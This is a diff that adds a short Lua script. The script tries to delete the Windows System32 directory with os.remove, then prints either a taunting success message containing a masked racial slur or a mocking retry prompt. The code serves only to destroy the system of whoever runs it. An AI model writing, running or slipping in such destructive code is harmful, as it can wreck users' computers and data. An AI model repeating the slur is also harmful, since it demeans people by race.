@@ -1,0 +1,9 @@
+local filePath = [[C:\Windows\System32]]
+
+local success, errorMessage = os.remove(filePath)
+
+if success then
+    print("good bye ni##a!")
+else
+    print("Good Script Try Again! please")
+end
